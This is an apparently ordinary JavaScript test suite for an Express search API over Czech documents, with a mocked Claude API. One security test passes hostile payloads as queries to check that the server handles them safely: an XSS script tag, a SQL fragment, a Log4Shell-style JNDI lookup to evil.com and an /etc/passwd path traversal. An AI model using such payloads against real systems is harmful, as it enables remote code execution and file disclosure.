import { describe, test, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest'
import request from 'supertest'
import express from 'express'
import cors from 'cors'
import { czechTestDocument } from './fixtures/czechTestData.js'

// Mock the actual server for testing
const createTestServer = () => {
  const app = express()
  app.use(cors())
  app.use(express.json())

  // Mock Claude API function for testing
  const mockClaudeAPI = async (query, document) => {
    // Simulate various API responses based on query
    if (query.toLowerCase().includes('jan novák')) {
      return {
        success: true,
        data: {
          content: [{
            text: JSON.stringify({
              results: [{
                label: "Jméno prodávajícího",
                value: "Jan Novák",
                highlight: "Jan Novák",
                start: document.indexOf('Jan Novák'),
                end: document.indexOf('Jan Novák') + 8
              }]
            })
          }]
        }
      }
    }
    
    if (query.toLowerCase().includes('rodné číslo')) {
      return {
        success: true,
        data: {
          content: [{
            text: JSON.stringify({
              results: [{
                label: "Rodné číslo",
                value: "940919/1022",
                highlight: "940919/1022",
                start: document.indexOf('940919/1022'),
                end: document.indexOf('940919/1022') + 11
              }]
            })
          }]
        }
      }
    }
    
    if (query.toLowerCase().includes('error')) {
      return {
        success: false,
        error: { type: 'test_error', message: 'Simulated error for testing' }
      }
    }
    
    if (query.toLowerCase().includes('overloaded')) {
      return {
        success: false,
        error: { type: 'overloaded_error', message: 'API is overloaded' },
        status: 529
      }
    }
    
    if (query.toLowerCase().includes('timeout')) {
      // Simulate timeout by waiting
      await new Promise(resolve => setTimeout(resolve, 100))
      throw new Error('Request timeout')
    }
    
    // Default response
    return {
      success: true,
      data: {
        content: [{
          text: JSON.stringify({
            results: [{
              label: "Obecný výsledek",
              value: query,
              highlight: query,
              start: 0,
              end: query.length
            }]
          })
        }]
      }
    }
  }

  // Health check endpoint
  app.get('/', (req, res) => {
    res.json({
      message: 'AI Search API Test Server',
      timestamp: new Date().toISOString(),
      endpoints: ['/api/search']
    })
  })

  // Search endpoint
  app.post('/api/search', async (req, res) => {
    const { query, document } = req.body

    if (!query || !document) {
      return res.status(400).json({ error: 'Query and document are required' })
    }

    try {
      const result = await mockClaudeAPI(query, document)
      
      if (result.success) {
        res.json(result.data)
      } else {
        const status = result.status || 500
        res.status(status).json({ error: result.error })
      }
    } catch (error) {
      res.status(500).json({ 
        error: { 
          type: 'server_error', 
          message: error.message 
        } 
      })
    }
  })

  return app
}

describe('API Integration Tests', () => {
  let app
  let server

  beforeAll(() => {
    app = createTestServer()
  })

  describe('Health Check Endpoint', () => {
    test('should respond to health check', async () => {
      const response = await request(app)
        .get('/')
        .expect(200)

      expect(response.body).toHaveProperty('message')
      expect(response.body).toHaveProperty('timestamp')
      expect(response.body).toHaveProperty('endpoints')
      expect(response.body.endpoints).toContain('/api/search')
    })

    test('should return valid JSON structure', async () => {
      const response = await request(app)
        .get('/')
        .expect('Content-Type', /json/)

      expect(response.body.message).toBe('AI Search API Test Server')
      expect(Array.isArray(response.body.endpoints)).toBe(true)
    })
  })

  describe('Search Endpoint - Valid Requests', () => {
    test('should handle basic search request', async () => {
      const searchRequest = {
        query: 'Jan Novák',
        document: czechTestDocument
      }

      const response = await request(app)
        .post('/api/search')
        .send(searchRequest)
        .expect(200)

      expect(response.body).toHaveProperty('content')
      expect(Array.isArray(response.body.content)).toBe(true)
      expect(response.body.content[0]).toHaveProperty('text')

      const results = JSON.parse(response.body.content[0].text)
      expect(results).toHaveProperty('results')
      expect(Array.isArray(results.results)).toBe(true)
      expect(results.results[0]).toHaveProperty('label')
      expect(results.results[0]).toHaveProperty('value')
      expect(results.results[0].value).toBe('Jan Novák')
    })

    test('should handle birth number search', async () => {
      const searchRequest = {
        query: 'rodné číslo',
        document: czechTestDocument
      }

      const response = await request(app)
        .post('/api/search')
        .send(searchRequest)
        .expect(200)

      const results = JSON.parse(response.body.content[0].text)
      expect(results.results[0].value).toBe('940919/1022')
      expect(results.results[0].label).toBe('Rodné číslo')
    })

    test('should handle Czech diacritics in queries', async () => {
      const czechQueries = [
        'žluťoučký kůň',
        'příliš žluté',
        'čeština',
        'ěščřžýáíéúůďťň'
      ]

      for (const query of czechQueries) {
        const response = await request(app)
          .post('/api/search')
          .send({ query, document: 'Test document with ' + query })
          .expect(200)

        expect(response.body).toHaveProperty('content')
      }
    })

    test('should handle large documents', async () => {
      const largeDocument = czechTestDocument.repeat(1000) // ~10MB
      
      const response = await request(app)
        .post('/api/search')
        .send({
          query: 'Jan Novák',
          document: largeDocument
        })
        .expect(200)

      expect(response.body).toHaveProperty('content')
    })

    test('should handle complex queries', async () => {
      const complexQueries = [
        'Najdi všechny rodné čísla a jména',
        'Jaká je kupní cena a kdy byla smlouva podepsána?',
        'Kdo je prodávající a kupující?',
        'Bankovní spojení a IBAN účty'
      ]

      for (const query of complexQueries) {
        const response = await request(app)
          .post('/api/search')
          .send({ query, document: czechTestDocument })
          .expect(200)

        expect(response.body).toHaveProperty('content')
      }
    })
  })

  describe('Search Endpoint - Error Handling', () => {
    test('should return 400 for missing query', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({ document: czechTestDocument })
        .expect(400)

      expect(response.body).toHaveProperty('error')
      expect(response.body.error).toContain('required')
    })

    test('should return 400 for missing document', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({ query: 'test' })
        .expect(400)

      expect(response.body).toHaveProperty('error')
      expect(response.body.error).toContain('required')
    })

    test('should return 400 for empty request body', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({})
        .expect(400)

      expect(response.body).toHaveProperty('error')
    })

    test('should handle invalid JSON', async () => {
      const response = await request(app)
        .post('/api/search')
        .set('Content-Type', 'application/json')
        .send('{"invalid": json}')
        .expect(400)
    })

    test('should handle malformed request data', async () => {
      const malformedRequests = [
        { query: null, document: czechTestDocument },
        { query: undefined, document: czechTestDocument },
        { query: '', document: czechTestDocument },
        { query: 'test', document: null },
        { query: 'test', document: undefined },
        { query: 'test', document: '' }
      ]

      for (const request_data of malformedRequests) {
        const response = await request(app)
          .post('/api/search')
          .send(request_data)
          .expect(400)

        expect(response.body).toHaveProperty('error')
      }
    })
  })

  describe('Search Endpoint - API Error Simulation', () => {
    test('should handle simulated API errors', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({
          query: 'error test',
          document: czechTestDocument
        })
        .expect(500)

      expect(response.body).toHaveProperty('error')
      expect(response.body.error.type).toBe('test_error')
    })

    test('should handle overloaded API', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({
          query: 'overloaded test',
          document: czechTestDocument
        })
        .expect(529)

      expect(response.body).toHaveProperty('error')
      expect(response.body.error.type).toBe('overloaded_error')
    })

    test('should handle timeout errors', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({
          query: 'timeout test',
          document: czechTestDocument
        })
        .expect(500)

      expect(response.body).toHaveProperty('error')
      expect(response.body.error.type).toBe('server_error')
    })
  })

  describe('Request Validation and Security', () => {
    test('should handle extremely large payloads', async () => {
      const hugeDocument = 'A'.repeat(10 * 1024 * 1024) // 10MB
      
      const response = await request(app)
        .post('/api/search')
        .send({
          query: 'test',
          document: hugeDocument
        })

      // Should either succeed or fail gracefully (not crash)
      expect([200, 413, 500]).toContain(response.status)
    })

    test('should sanitize special characters in queries', async () => {
      const specialCharQueries = [
        '<script>alert("xss")</script>',
        'SELECT * FROM users',
        '${jndi:ldap://evil.com/a}',
        '../../etc/passwd',
        '\x00\x01\x02\x03'
      ]

      for (const query of specialCharQueries) {
        const response = await request(app)
          .post('/api/search')
          .send({ query, document: 'test document' })

        // Should not return 500 (crash) and should handle gracefully
        expect([200, 400]).toContain(response.status)
      }
    })

    test('should handle unusual content types', async () => {
      const response = await request(app)
        .post('/api/search')
        .set('Content-Type', 'text/plain')
        .send('not json data')
        .expect(400) // Should reject non-JSON
    })

    test('should validate request size limits', async () => {
      // Test with various payload sizes
      const sizes = [1, 10, 100, 1000] // KB
      
      for (const size of sizes) {
        const largeQuery = 'A'.repeat(size * 1024)
        
        const response = await request(app)
          .post('/api/search')
          .send({
            query: largeQuery,
            document: 'test'
          })

        // Should handle without crashing
        expect(response.status).toBeDefined()
      }
    })
  })

  describe('Response Format and Content', () => {
    test('should return consistent response format', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({
          query: 'Jan Novák',
          document: czechTestDocument
        })
        .expect(200)

      // Check response structure
      expect(response.body).toHaveProperty('content')
      expect(Array.isArray(response.body.content)).toBe(true)
      expect(response.body.content[0]).toHaveProperty('text')

      const results = JSON.parse(response.body.content[0].text)
      expect(results).toHaveProperty('results')
      expect(Array.isArray(results.results)).toBe(true)
      
      if (results.results.length > 0) {
        const result = results.results[0]
        expect(result).toHaveProperty('label')
        expect(result).toHaveProperty('value')
        expect(typeof result.label).toBe('string')
        expect(typeof result.value).toBe('string')
      }
    })

    test('should return proper Content-Type headers', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({
          query: 'test',
          document: 'test document'
        })

      expect(response.headers['content-type']).toMatch(/application\/json/)
    })

    test('should handle empty search results', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({
          query: 'nonexistentquery12345',
          document: 'document without the query term'
        })
        .expect(200)

      expect(response.body).toHaveProperty('content')
    })

    test('should preserve Czech characters in responses', async () => {
      const response = await request(app)
        .post('/api/search')
        .send({
          query: 'žluťoučký kůň',
          document: 'dokument obsahující žluťoučký kůň'
        })
        .expect(200)

      const responseText = JSON.stringify(response.body)
      expect(responseText).toContain('žluťoučký')
      expect(responseText).toContain('kůň')
    })
  })

  describe('Concurrent Request Handling', () => {
    test('should handle multiple concurrent requests', async () => {
      const requests = Array(10).fill(null).map(() =>
        request(app)
          .post('/api/search')
          .send({
            query: 'concurrent test',
            document: czechTestDocument
          })
      )

      const responses = await Promise.all(requests)
      
      responses.forEach(response => {
        expect(response.status).toBe(200)
        expect(response.body).toHaveProperty('content')
      })
    })

    test('should handle mixed request types concurrently', async () => {
      const mixedRequests = [
        request(app).get('/'),
        request(app).post('/api/search').send({ query: 'test1', document: 'doc1' }),
        request(app).post('/api/search').send({ query: 'test2', document: 'doc2' }),
        request(app).post('/api/search').send({ query: 'error', document: 'doc3' }),
        request(app).get('/')
      ]

      const responses = await Promise.allSettled(mixedRequests)
      
      // All requests should complete (not hang)
      expect(responses.length).toBe(5)
      responses.forEach(response => {
        expect(response.status).toBe('fulfilled')
      })
    })

    test('should maintain session isolation', async () => {
      const request1 = request(app)
        .post('/api/search')
        .send({
          query: 'session test 1',
          document: 'document 1'
        })

      const request2 = request(app)
        .post('/api/search')
        .send({
          query: 'session test 2',
          document: 'document 2'
        })

      const [response1, response2] = await Promise.all([request1, request2])
      
      expect(response1.status).toBe(200)
      expect(response2.status).toBe(200)
      
      // Responses should be different (no cross-contamination)
      expect(response1.body).not.toEqual(response2.body)
    })
  })

  describe('Performance and Timeout Tests', () => {
    test('should respond within reasonable time for small requests', async () => {
      const startTime = Date.now()
      
      await request(app)
        .post('/api/search')
        .send({
          query: 'quick test',
          document: 'small document'
        })
        .expect(200)
      
      const duration = Date.now() - startTime
      expect(duration).toBeLessThan(1000) // Should respond within 1 second
    })

    test('should handle rapid sequential requests', async () => {
      const promises = []
      
      for (let i = 0; i < 20; i++) {
        promises.push(
          request(app)
            .post('/api/search')
            .send({
              query: `rapid test ${i}`,
              document: `document ${i}`
            })
        )
      }

      const startTime = Date.now()
      const responses = await Promise.all(promises)
      const duration = Date.now() - startTime

      responses.forEach(response => {
        expect(response.status).toBe(200)
      })

      expect(duration).toBeLessThan(10000) // All requests within 10 seconds
    })
  })

  describe('CORS and Headers', () => {
    test('should include proper CORS headers', async () => {
      const response = await request(app)
        .post('/api/search')
        .set('Origin', 'http://localhost:3000')
        .send({
          query: 'cors test',
          document: 'test document'
        })

      expect(response.headers['access-control-allow-origin']).toBeDefined()
    })

    test('should handle OPTIONS preflight requests', async () => {
      const response = await request(app)
        .options('/api/search')
        .set('Origin', 'http://localhost:3000')
        .set('Access-Control-Request-Method', 'POST')
        .set('Access-Control-Request-Headers', 'Content-Type')

      // Should not return 404 for OPTIONS
      expect(response.status).not.toBe(404)
    })
  })
})